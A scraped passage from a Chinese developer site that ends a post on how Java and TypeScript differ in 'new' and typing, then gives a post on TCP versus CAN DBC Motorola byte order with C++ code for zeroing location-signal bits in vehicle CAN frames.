<p>当你执行 <code>new</code> 时，JS 引擎做了这 4 件事：</p>
<ol>
<li>创建一个空的哈希表 <code>{}</code>。</li>
<li>把这个空表的 <code>__proto__</code> 指针指向类的 <code>prototype</code>（为了能用类的方法）。</li>
<li>执行构造函数（Constructor），给这个哈希表塞入初始属性（如 <code>this.amount = 0</code>）。</li>
<li>返回这个哈希表。</li>
</ol>
<p><strong>结论</strong>：JS 对象本质上是一团可以随意揉捏的黏土。</p>
<p>虽然 TypeScript 的编译器（tsc）会像 Java 一样检查你的拼写，但在<strong>运行时</strong>，你完全可以给这个对象追加任何属性（<code>record.whatever = 123</code>），JS 引擎绝不会拦你。</p>
<hr/>
<h2 data-id="heading-3">⚔️ 二、赋值逻辑：权限控制 vs 约定俗成</h2>
<h3 data-id="heading-4">Java：严防死守</h3>
<p>Java 能不能直接赋值，取决于<strong>访问修饰符</strong>。</p>
<ul>
<li>如果 <code>amount</code> 是 <code>public</code>，可以。</li>
<li>但 Java 开发的黄金法则是 <strong>封装（Encapsulation）</strong> 。绝大多数 entity/dto 的字段都是 <code>private</code> 的，必须通过 <code>setAmount()</code> 方法来访问。</li>
<li><strong>为什么？</strong> 为了安全。Java 可以在 setter 里加逻辑（比如 <code>if (amount &lt; 0) throw error</code>），保证数据安全。</li>
</ul>
<h3 data-id="heading-5">TypeScript：自由奔放</h3>
<p>TypeScript 默认所有属性都是 <code>public</code>。</p>
<p>在 TS/JS 生态中，直接操作属性（<code>record.amount = 100</code>）是<strong>标准做法</strong>。</p>
<ul>
<li>我们很少在 DTO 里写 <code>getAmount()</code> / <code>setAmount()</code>。</li>
<li><strong>为什么？</strong> 因为 JS 追求灵活性和简洁。如果真要控制权限，TS 也有 <code>private</code> 关键字，但那只是编译时的约束，编译成 JS 后，私有属性依然可以被访问（虽然不推荐）。</li>
</ul>
<hr/>
<h2 data-id="heading-6">🦆 三、类型系统：名义 vs 结构 (核心差异)</h2>
<p>这是最颠覆 Java 开发者认知的一点。</p>
<h3 data-id="heading-7">Java：名义类型 (Nominal Typing)</h3>
<p>Java 只认<strong>名字</strong>（身份证）。</p>
<p>哪怕两个类长得一模一样，名字不一样，就是不兼容。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> { <span class="hljs-type">int</span> x; }
<span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> { <span class="hljs-type">int</span> x; }
<span class="hljs-type">A</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>(); <span class="hljs-comment">// ❌ 报错！B 不是 A。</span>
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-8">TypeScript：结构化类型 (Structural / Duck Typing)</h3>
<p>TypeScript 只认<strong>长相</strong>（鸭子测试）。</p>
<p>只要你长得像（属性列表匹配），你就是它。</p>
<pre><code class="hljs language-css" lang="css">class <span class="hljs-selector-tag">A</span> { x: number; }
class <span class="hljs-selector-tag">B</span> { x: number; }
const obj: A = new <span class="hljs-built_in">B</span>(); // ✅ 通过！因为 <span class="hljs-selector-tag">B</span> 也有 x，结构满足 <span class="hljs-selector-tag">A</span> 的要求。
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<p>这也是为什么在 TS 里，你经常看到有人<strong>偷懒</strong>，不用 <code>new</code>，而是直接写个字面量对象：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// TS 允许这样（只要属性对得上）</span>
<span class="hljs-keyword">const</span> <span class="hljs-keyword">record</span>: <span class="hljs-title">CountPointsTransactDto</span> = { amount: <span class="hljs-number">100</span> }; 
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-9">🤔 四、灵魂拷问：既然如此，为什么还要用 <code>new</code>？</h2>
<p>既然 <code>{ amount: 100 }</code> 就能冒充 DTO，为什么我们在 NestJS 中还是推荐写：</p>
<p><code>const record = new CountPointsTransactDto();</code></p>
<p>原因有三：</p>
<ol>
<li>
<p><strong>初始值 (Default Values)</strong> ：</p>
<p>类里定义了 <code>status = 'PENDING'</code>，<code>new</code> 出来的对象自动就有。字面量 <code>{}</code> 必须手动写一遍。</p>
</li>
<li>
<p><strong>方法 (Methods)</strong> ：</p>
<p>只有 <code>new</code> 出来的实例才挂载了原型链，才能调用 DTO 里定义的 <code>isValid()</code> 或 <code>calculateTax()</code> 方法。</p>
</li>
<li>
<p><strong>元数据 (Metadata &amp; Decorators)</strong> ：</p>
<p>这是最重要的。NestJS 大量使用装饰器（如 <code>@IsString()</code>, <code>@Expose()</code>）。</p>
<p><strong>纯 JSON 对象是不带这些装饰器信息的</strong>。只有通过 <code>class-transformer</code> 的 <code>plainToInstance</code> 或者直接 <code>new</code> 出来的对象，验证管道（ValidationPipe）才能正常工作。</p>
</li>
</ol>
<hr/>
<h2 data-id="heading-10">📝 总结</h2>



































<table><thead><tr><th><strong>特性</strong></th><th><strong>Java (new)</strong></th><th><strong>TypeScript / JS (new)</strong></th></tr></thead><tbody><tr><td><strong>本质</strong></td><td>按照蓝图开辟固定内存块</td><td>创建空哈希表，链接原型链</td></tr><tr><td><strong>结构灵活性</strong></td><td><strong>不可变</strong> (编译后固定)</td><td><strong>高度可变</strong> (运行时可增删属性)</td></tr><tr><td><strong>属性赋值</strong></td><td>依赖 public/private，常用 Setter</td><td>默认 public，常用直接赋值</td></tr><tr><td><strong>类型兼容</strong></td><td><strong>看名字</strong> (必须是同一个类或子类)</td><td><strong>看结构</strong> (属性匹配即可)</td></tr><tr><td><strong>使用建议</strong></td><td>必须用 <code>new</code></td><td>推荐用 <code>new</code> (为了默认值和装饰器)</td></tr></tbody></table>
<p><strong>一句话总结：</strong></p>
<p>不要被 TypeScript 的语法糖欺骗了。它虽然穿上了 Java 的西装（Class, new, private），但它的灵魂依然是那个自由、灵活、基于原型的 JavaScript。理解了这一点，你写出的 TS 代码才会有真正的“TS 味”。</p>
<p>​同一个 new，不同的世界：Java 与 TypeScript 对象创建机制的降维打击</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[车载大端序和tcp大端序]]></title>    <link>https://juejin.cn/post/7605792874173415487</link>    <guid>https://juejin.cn/post/7605792874173415487</guid>    <pubDate>2026-02-13T03:01:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605792874173415487" data-draft-id="7605807405307215935" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="车载大端序和tcp大端序"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-13T03:01:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="十间fish"/> <meta itemprop="url" content="https://juejin.cn/user/2165385864686928"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            车载大端序和tcp大端序
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2165385864686928/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    十间fish
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T03:01:15.000Z" title="Fri Feb 13 2026 03:01:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><ul>
<li>
<p><strong>TCP/IP 大端 = 网络字节序 = htonl/htons</strong></p>
</li>
<li>
<p><strong>CAN DBC 大端 = Motorola 格式（CANoe/CANdb++ 里的 MSB）</strong></p>
</li>
</ul>
<h2 data-id="heading-0">一个字节内部的 bit 是固定的</h2>
<p>任何一个字节，硬件上永远是：</p>
<p>plaintext</p>
<pre><code class="hljs language-markdown" lang="markdown">bit7  bit6  bit5  bit4  bit3  bit2  bit1  bit0
<span class="hljs-code">                                  
最高位                                    最低位
</span></code></pre>
<h3 data-id="heading-1">这个 <strong>bit7~bit0 的顺序，永远不会变</strong>。不管你用大端、小端、网络序、DBC，<strong>单个字节内部的 bit 编号永远固定</strong>。</h3>
<h3 data-id="heading-2">① TCP 大端（网络字节序）</h3>
<ul>
<li>只管<strong>字节序</strong>，不管<strong>位序</strong></li>
<li>字节：<strong>高字节在前，低字节在后</strong></li>
<li>位序：<strong>每个字节内部，位序不变</strong></li>
</ul>
<p>复习：</p>
<p>以 32 位整数 <code>0x12345678</code> 为例：</p>
<p>它在内存里（小端 CPU，比如 ARM/x86）是：</p>
<p>plaintext</p>
<pre><code class="hljs">低地址 → 高地址
0x78  0x56  0x34  0x12
</code></pre>
<p>用 <code>htonl</code> 转成 <strong>TCP 大端（网络序）</strong> 后：</p>
<p>plaintext</p>
<pre><code class="hljs">0x12  0x34  0x56  0x78
</code></pre>
<p>例：<code>0x12345678</code>TCP 大端传输：<code>12 34 56 78</code></p>
<h3 data-id="heading-3">② DBC 大端（Motorola）</h3>
<p><strong>既管字节序，又管位序，是 “整段信号按位从高往低排”</strong></p>
<p>规则：</p>
<ol>
<li><strong>信号的最高位（MSB）放在 CAN 报文的最高地址位</strong></li>
<li><strong>跨字节时，字节是大端顺序（高字节→低字节）</strong></li>
<li><strong>字节内部位也是大端位序（bit7→bit0）</strong></li>
</ol>
<p>DBC 信号解析必须：</p>
<ul>
<li>按 <strong>start_bit、length、byte_order=Motorola</strong> 逐位抽取</li>
<li>DBC 的 start_bit 不是从 Byte0 开始算，而是从 Byte7.bit7 开始算。</li>
<li>DBC Motorola 的信号，是从「你指定的 start_bit」开始，往「更小的数字」方向，连续占 N 个 bit。</li>
</ul>
<h4 data-id="heading-4">所谓的跨字节理解，取决于信号的长度</h4>
<h2 data-id="heading-5">用一个 32bit 信号，给你看什么叫「跨字节」</h2>
<p>我们定义一个信号：</p>
<ul>
<li><strong>Motorola 大端</strong></li>
<li><strong>start_bit = 63</strong>（就是 Byte7.bit7）</li>
<li><strong>length = 32 bit</strong></li>
</ul>
<h3 data-id="heading-6">它占的 bit 是：</h3>
<p>63 → 62 → 61 → … → 32一共 32 个 bit</p>
<h3 data-id="heading-7">对应到字节：</h3>
<ul>
<li>63～56 → <strong>Byte7</strong></li>
<li>55～48 → <strong>Byte6</strong></li>
<li>47～40 → <strong>Byte5</strong></li>
<li>39～32 → <strong>Byte4</strong></li>
</ul>
<h4 data-id="heading-8">信号横跨：</h4>
<p><strong>Byte7、Byte6、Byte5、Byte4</strong>这就是我之前说的：<strong>一个信号横跨 4 个字节。</strong></p>
<h2 data-id="heading-9">看需求：</h2>
<h4 data-id="heading-10">一、需求描述：（3.0）</h4>
<p>1）位置信息共享软开关关闭状态下，位置信息相关信号上传赋值0处理；</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0c38b33d98a94a19b3d2a664f6d3e66f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2B6Ze0ZmlzaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771556475&amp;x-signature=60daghAWD%2F1uRjPpYreV6yi%2FloE%3D" alt="企业微信截图_17709510982755.png" loading="lazy"/></p>
<p>工具：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.csselectronics.com%2Fpages%2Fdbc-editor-can-bus-database" target="_blank" title="https://www.csselectronics.com/pages/dbc-editor-can-bus-database" ref="nofollow noopener noreferrer">DBC Editor for CAN Bus Database Files [Online | 100% Free] – CSS Electronics</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/33fa594ccb704d8a9b493707b0b5acaf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2B6Ze0ZmlzaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771556475&amp;x-signature=uqGJ%2BZcyCPTbBE7Lued8K35ExTw%3D" alt="企业微信截图_17708910896928.png" loading="lazy"/></p>
<h3 data-id="heading-11">2.2 MCU打包协议数据格式关键解析点</h3>
<p>(1)整体数据格式</p>



















<table><thead><tr><th>帧头（2Byte）</th><th>Payload数据长度（2Byte）</th><th>Counter（1Byte）</th><th>CRC（1Byte）</th><th>Payload（可变长度）</th></tr></thead><tbody><tr><td>0x514D</td><td> </td><td> </td><td> </td><td>包含 N 帧子数据</td></tr></tbody></table>
<p>（2）Payload 中的单帧子数据格式（确认.=》报文类型&amp;帧ID作为整体处理）</p>

















<table><thead><tr><th>起始标识（1Byte）</th><th>报文类型 + 帧 ID（2Byte）</th><th>Updatebit + 帧长度（1Byte）</th><th>帧数据（8-64Byte）</th></tr></thead><tbody><tr><td>0x55（有效帧）</td><td>高 4 位 = 报文类型（如 0x00=ZCU_CANFD1）低 12 位 = CanId</td><td>最高位 = Updatebit低 7 位 = 帧数据长度</td><td/></tr></tbody></table>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">PositionSignalProcessor::clearBitsDBCBigEndian</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span>* data, <span class="hljs-type">int</span> data_len, <span class="hljs-type">uint32_t</span> start, <span class="hljs-type">uint32_t</span> length)</span> </span>{
    <span class="hljs-keyword">if</span> (data == <span class="hljs-literal">nullptr</span> || data_len &lt;= <span class="hljs-number">0</span> || length == <span class="hljs-number">0</span>) {
        <span class="hljs-built_in">debugPrint</span>(<span class="hljs-string">"clearBitsDBCBigEndian: (data=%p, data_len=%d, start=%d, length=%d)\n"</span>,
                   data, data_len, start, length);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
    
   <span class="hljs-comment">// DBC大端字节序：按字节顺序，非连续位</span>
    <span class="hljs-type">int</span> startByte = start / <span class="hljs-number">8</span>;
    <span class="hljs-type">int</span> bitsInStartByte = start % <span class="hljs-number">8</span> + <span class="hljs-number">1</span>;
    <span class="hljs-type">int</span> bitsLeft = length - bitsInStartByte;
    
    <span class="hljs-comment">// 边界检查</span>
    <span class="hljs-keyword">if</span> (startByte &gt;= data_len) {
        <span class="hljs-built_in">debugPrint</span>(<span class="hljs-string">"frame boundary: startByte=%d &gt;= data_len=%d\n"</span>, startByte, data_len);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
    <span class="hljs-comment">// 保存原始数据用于调试</span>
    std::vector&lt;<span class="hljs-type">uint8_t</span>&gt; originalData;
    <span class="hljs-keyword">if</span> (m_debug) {
        originalData.<span class="hljs-built_in">assign</span>(data, data + data_len);
    }
    <span class="hljs-comment">// 如果有多于一个字节的位需要处理</span>
    <span class="hljs-keyword">if</span> (bitsLeft &gt; <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// 清除第一个字节的高位</span>
        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> mask = <span class="hljs-number">0xFF</span> &lt;&lt; bitsInStartByte;
        data[startByte] &amp;= mask;

        <span class="hljs-comment">// 清除所有中间字节</span>
        <span class="hljs-type">int</span> middleByte = startByte + (bitsLeft) / <span class="hljs-number">8</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = startByte + <span class="hljs-number">1</span>; i &lt;= middleByte; ++i) {
            data[i] = <span class="hljs-number">0</span>;
        }

        <span class="hljs-comment">// 处理最后一个字节的低位</span>
        <span class="hljs-type">int</span> lastByteBitsLeft = bitsLeft % <span class="hljs-number">8</span>;
        <span class="hljs-keyword">if</span> (lastByteBitsLeft &gt; <span class="hljs-number">0</span>) {
            <span class="hljs-comment">/*
             -1：将 1 &lt;&lt; n 生成的「1 后跟 n 个 0」的数，转为「n 个 1」的二进制数
             可以想象成「最右侧 N 个格子为 1，其余为 0」的遮挡板
             掩码为 1 的格子保留原值，掩码为 0 的格子清零
            */</span> 
            mask = (<span class="hljs-number">1</span> &lt;&lt; (<span class="hljs-number">8</span> - lastByteBitsLeft)) - <span class="hljs-number">1</span>;
            data[middleByte + <span class="hljs-number">1</span>] &amp;= mask;
        }
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 单字节情况</span>
        <span class="hljs-type">int</span> startBit = bitsInStartByte - length;
        <span class="hljs-comment">/*
            注意:单字节和上面的最后一个字节的处理不一样
            上面的处理只适用于：不管清零位在哪个位置，都只把「最右侧 N 个格子」设为 1
            而一旦清零位是字节中间位，就不适用。用下面数据可验证:
            9A 03 BB 64 1A 0A 67 28
            2.start = 36,len = 3 =&gt; 结果是 9A 03 BB 64 02 0A 67 28
        */</span>
        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> mask = ((<span class="hljs-number">1</span> &lt;&lt; length) - <span class="hljs-number">1</span>) &lt;&lt; startBit;
        data[startByte] &amp;= ~mask;
    }
    
    <span class="hljs-comment">// 调试输出</span>
    <span class="hljs-keyword">if</span> (m_debug) {
        <span class="hljs-built_in">debugPrint</span>(<span class="hljs-string">"clearBitsDBCBigEndian: 处理前数据 (start=%d, length=%d): \n"</span>, start, length);
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; data_len; ++i) {
            <span class="hljs-built_in">debugPrint</span>(<span class="hljs-string">"%02X "</span>, originalData[i]);
        }
        <span class="hljs-built_in">debugPrint</span>(<span class="hljs-string">"\n"</span>);

        <span class="hljs-built_in">debugPrint</span>(<span class="hljs-string">"clearBitsDBCBigEndian: 处理后数据: \n"</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; data_len; ++i) {
            <span class="hljs-built_in">debugPrint</span>(<span class="hljs-string">"%02X "</span>, data[i]);
        }
        <span class="hljs-built_in">debugPrint</span>(<span class="hljs-string">"\n"</span>);
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
}

<span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">PositionSignalProcessor::clearBitsIntelLittleEndian</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span>* data, <span class="hljs-type">int</span> data_len, <span class="hljs-type">uint32_t</span> start, <span class="hljs-type">uint32_t</span> length)</span> </span>{
     <span class="hljs-keyword">if</span> (data == <span class="hljs-literal">nullptr</span> || data_len &lt;= <span class="hljs-number">0</span> || length == <span class="hljs-number">0</span>) {
        <span class="hljs-built_in">debugPrint</span>(<span class="hljs-string">"clearBitsIntelLittleEndian: (data=%p, data_len=%d, start=%u, length=%u)\n"</span>,
                   data, data_len, start, length);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
    <span class="hljs-comment">// 小端边界检查</span>
    <span class="hljs-keyword">if</span> (start - length + <span class="hljs-number">1</span> &lt; <span class="hljs-number">0</span>) {
        <span class="hljs-built_in">debugPrint</span>(<span class="hljs-string">"clearBitsIntelLittleEndian: frame boundary: start=%u, length=%u, start-length+1 &lt; 0\n"</span>, start, length);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }

    <span class="hljs-type">int</span> downByte = <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">uint32_t</span>&gt;(data_len) - <span class="hljs-number">1</span> - start / <span class="hljs-number">8</span>;
    <span class="hljs-keyword">if</span> (downByte &lt; <span class="hljs-number">0</span>) {
        <span class="hljs-built_in">debugPrint</span>(<span class="hljs-string">"clearBitsIntelLittleEndian: frame boundary: downByte=%d &gt;= data_len=%d\n"</span>, downByte, data_len);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
    <span class="hljs-type">int</span> bitsInDownByte = <span class="hljs-number">8</span> - start % <span class="hljs-number">8</span>;
    <span class="hljs-type">int</span> bitsLeft = length - bitsInDownByte;

    <span class="hljs-keyword">if</span> (bitsLeft &gt; <span class="hljs-number">0</span>) {
        <span class="hljs-built_in">debugPrint</span>(<span class="hljs-string">"clearBitsIntelLittleEndian: Multi byte case, start=%d, bitsInDownByte=%d, length=%d,bitsLeft=%d\n"</span>, start, bitsInDownByte, length,bitsLeft);
        <span class="hljs-comment">// 清除第一个字节的低位</span>
        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> mask = <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">uint8_t</span>&gt;(<span class="hljs-number">0xFF</span> &gt;&gt; bitsInDownByte);
        data[downByte] &amp;= mask;

        <span class="hljs-comment">// 清除中间字节</span>
        <span class="hljs-type">int</span> middleByte = downByte - (bitsLeft) / <span class="hljs-number">8</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = downByte - <span class="hljs-number">1</span>; i &gt;= middleByte; --i) {
            data[i] = <span class="hljs-number">0</span>;
        }

        <span class="hljs-comment">// 处理最后一个字节的高位</span>
        <span class="hljs-type">int</span> lastByteBitsLeft = bitsLeft % <span class="hljs-number">8</span>;
        <span class="hljs-keyword">if</span> (lastByteBitsLeft &gt; <span class="hljs-number">0</span>) {
            <span class="hljs-type">int</span> lastByteIdx = middleByte - <span class="hljs-number">1</span>;
            <span class="hljs-keyword">if</span> (lastByteIdx &gt;= <span class="hljs-number">0</span>) {
                mask = <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">uint8_t</span>&gt;(<span class="hljs-number">0xFF</span> &lt;&lt; lastByteBitsLeft);
                data[lastByteIdx] &amp;= mask;
            }<span class="hljs-keyword">else</span>{
                <span class="hljs-built_in">debugPrint</span>(<span class="hljs-string">"clearBitsIntelLittleEndian: frame boundary lastByteIdx=%d out of bounds\n"</span>, lastByteIdx);
                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
            }
        }
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 单字节情况</span>
        <span class="hljs-built_in">debugPrint</span>(<span class="hljs-string">"clearBitsIntelLittleEndian: Single byte case, start=%d, bitsInDownByte=%d, length=%d,bitsLeft=%d\n"</span>, start, bitsInDownByte, length,bitsLeft);
        <span class="hljs-type">int</span> leftBit = <span class="hljs-number">9</span> - start % <span class="hljs-number">8</span> - length;
        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> mask = <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">uint8_t</span>&gt;(((<span class="hljs-number">1</span> &lt;&lt; length) - <span class="hljs-number">1</span>) &lt;&lt; leftBit);
        data[downByte] &amp;= ~mask;
    }

    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
}



